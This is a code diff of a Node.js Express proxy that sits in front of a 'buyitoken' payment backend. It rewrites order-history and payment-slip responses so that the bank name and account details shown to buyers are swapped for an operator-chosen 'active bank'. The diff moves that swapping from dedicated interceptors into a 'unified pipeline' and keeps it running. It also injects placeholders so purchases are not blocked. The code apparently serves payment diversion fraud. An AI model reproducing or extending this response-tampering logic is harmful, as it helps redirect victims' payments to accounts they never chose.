@@ -217,6 +217,7 @@ async function saveData(data) {
 }
 
 function getActiveBank(data, userId) {
+  if (!data || !data.banks || data.banks.length === 0) return null;
   const uo = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
   if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
     return data.banks[uo.bankIndex];
@@ -1410,73 +1411,6 @@ app.get('/app/jsValue/:type', async (req, res) => {
   }
 });
 
-// ── Explicit High-Priority Interceptor for Buy History (/xxapi/buyitoken/history) ──
-app.all(['/xxapi/buyitoken/history', '/xxapi/buyitoken/history*'], async (req, res) => {
-  try {
-    if (req.method === 'OPTIONS') {
-      res.setHeader('Access-Control-Allow-Origin', '*');
-      res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
-      res.setHeader('Access-Control-Allow-Headers', '*');
-      res.setHeader('Access-Control-Allow-Credentials', 'true');
-      return res.status(200).end('OK');
-    }
-    const data = await loadData();
-    const { response, respBody, respHeaders } = await proxyToTivox(req);
-    let jsonResp = null;
-    try { jsonResp = JSON.parse(respBody); } catch (e) { }
-
-    if (jsonResp && jsonResp.data) {
-      const activeBank = getActiveBank(data, null);
-      if (activeBank && data.botEnabled !== false) {
-        const orderList = Array.isArray(jsonResp.data) ? jsonResp.data : (Array.isArray(jsonResp.data.list) ? jsonResp.data.list : (Array.isArray(jsonResp.data.data) ? jsonResp.data.data : []));
-        for (const order of orderList) {
-          if (!order || typeof order !== 'object') continue;
-          const orderId = String(order.rptNo || order.orderNo || order.id || '');
-          const altId = String(order.orderNo || order.rptNo || '');
-          const targetBank = resolveTargetBank(data, orderId, altId, activeBank);
-          replaceOrderBankDetails(order, targetBank);
-        }
-      }
-    }
-
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch (e) {
-    console.error('History explicit route error:', e.message);
-    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
-  }
-});
-
-// ── Explicit High-Priority Interceptor for Payment Slip Detail (/xxapi/buyitoken/paymentslipdetail) ──
-app.all(['/xxapi/buyitoken/paymentslipdetail', '/xxapi/buyitoken/paymentslipdetail*'], async (req, res) => {
-  try {
-    if (req.method === 'OPTIONS') {
-      res.setHeader('Access-Control-Allow-Origin', '*');
-      res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
-      res.setHeader('Access-Control-Allow-Headers', '*');
-      res.setHeader('Access-Control-Allow-Credentials', 'true');
-      return res.status(200).end('OK');
-    }
-    const data = await loadData();
-    const { response, respBody, respHeaders } = await proxyToTivox(req);
-    let jsonResp = null;
-    try { jsonResp = JSON.parse(respBody); } catch (e) { }
-
-    if (jsonResp && jsonResp.data && typeof jsonResp.data === 'object') {
-      const activeBank = getActiveBank(data, null);
-      if (activeBank && data.botEnabled !== false) {
-        const orderId = String(jsonResp.data.rptNo || jsonResp.data.id || jsonResp.data.orderNo || req.query.id || '');
-        const targetBank = resolveTargetBank(data, orderId, '', activeBank);
-        replaceOrderBankDetails(jsonResp.data, targetBank);
-      }
-    }
-
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch (e) {
-    console.error('paymentslipdetail explicit route error:', e.message);
-    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
-  }
-});
-
 app.all('/xxapi/*', async (req, res) => {
   try {
     const data = await loadData();
@@ -1681,27 +1615,7 @@ app.all('/xxapi/*', async (req, res) => {
           return res.status(200).json(slipResp);
         }
       }
-      // If backend responded fine, we still need to replace bank details!
-      if (!slipFailed && sj2 && sj2.data) {
-        const activeBank = getActiveBank(data, null);
-        if (activeBank) {
-          const hasBank = scanHasBankFields(sj2.data, 0);
-          if (hasBank) deepReplaceBankFields(sj2.data, activeBank, 0, hasBank);
-
-          if (activeBank.bankName) {
-            sj2.data.bankName = activeBank.bankName;
-            if (sj2.data.acctBankName !== undefined) sj2.data.acctBankName = activeBank.bankName;
-            if (sj2.data.bank !== undefined) sj2.data.bank = activeBank.bankName;
-          }
-
-          // Stringify the updated JSON and update headers
-          const newBody = JSON.stringify(sj2);
-          sh2['content-length'] = String(Buffer.byteLength(newBody));
-          res.writeHead(sd.status, sh2);
-          return res.end(newBody);
-        }
-      }
-      // If no active bank or didn't replace, just let the main pipeline handle it
+      // If backend responded fine, let the unified pipeline handle full replacement
     }
 
     // ── availablect — if empty list, inject a placeholder so frontend doesn't block buy ──
